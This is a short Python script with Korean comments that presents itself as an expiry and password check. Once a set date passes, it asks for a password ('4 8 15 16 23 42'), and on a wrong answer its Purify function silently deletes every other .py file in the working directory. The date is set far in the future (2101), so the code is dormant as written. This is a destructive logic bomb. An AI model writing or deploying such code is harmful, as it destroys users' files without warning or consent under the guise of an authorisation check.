import os
from datetime import datetime
from time import sleep

now = datetime.now()
#print("오늘 : " , now)
expireDate = datetime.strptime("21010730","%Y%m%d")
#print("유효기간 : " , expireDate)

thisName = os.path.basename(os.path.abspath( __file__ ))



def Purify(path):
    i = 1
    for filename in os.listdir(path):
        if filename.endswith(".py") and filename != thisName :
            #print(filename)
            os.remove(filename)
        i += 1

def AuthCheck() : 


    if now > expireDate :
            
        pw = input(">: ")

        if pw != "4 8 15 16 23 42" : 
            Purify(os.getcwd())
            # while True :
                
            #     print("System Failure")
            #     sleep(0.3)
    

# else :
#     if (expireDate - now).days >= 1 :
#         print("유효기간이 ", (expireDate - now).days, "일 남았습니다.")
    
#     elif (expireDate - now).seconds / 3600 >= 0 :
#         print("유효기간이 ", (expireDate - now).seconds / 3600, "시간 남았습니다.")
        
#     elif (expireDate - now).seconds / 60 >= 0 :
#         print("유효기간이 ", (expireDate - now).seconds / 60, "분 남았습니다.")


 



#sleep(5)